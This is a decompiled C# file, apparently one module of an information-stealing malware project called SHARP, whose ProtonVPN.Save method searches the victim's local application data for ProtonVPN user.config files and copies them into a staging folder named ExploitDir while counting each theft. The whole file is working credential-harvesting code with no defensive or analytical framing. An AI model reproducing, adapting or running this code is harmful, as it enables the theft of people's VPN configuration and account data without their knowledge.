﻿using System;
using System.IO;

namespace SHARP
{
	// Token: 0x0200006E RID: 110
	internal class ProtonVPN
	{
		// Token: 0x06000251 RID: 593 RVA: 0x0000ECB8 File Offset: 0x0000CEB8
		public static void Save()
		{
			string exploitDir = Help.ExploitDir;
			string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "ProtonVPN");
			if (!Directory.Exists(path))
			{
				return;
			}
			try
			{
				foreach (string text in Directory.GetDirectories(path))
				{
					if (text.Contains("ProtonVPN.exe"))
					{
						string[] directories2 = Directory.GetDirectories(text);
						for (int j = 0; j < directories2.Length; j++)
						{
							string text2 = directories2[j] + "\\user.config";
							string text3 = Path.Combine(exploitDir + "\\VPN\\ProtonVPN", new DirectoryInfo(Path.GetDirectoryName(text2)).Name);
							if (!Directory.Exists(text3))
							{
								Directory.CreateDirectory(text3);
								File.Copy(text2, text3 + "\\user.config");
								Counting.ProtonVPN++;
							}
						}
					}
				}
			}
			catch (Exception value)
			{
				Console.WriteLine(value);
			}
		}
	}
}
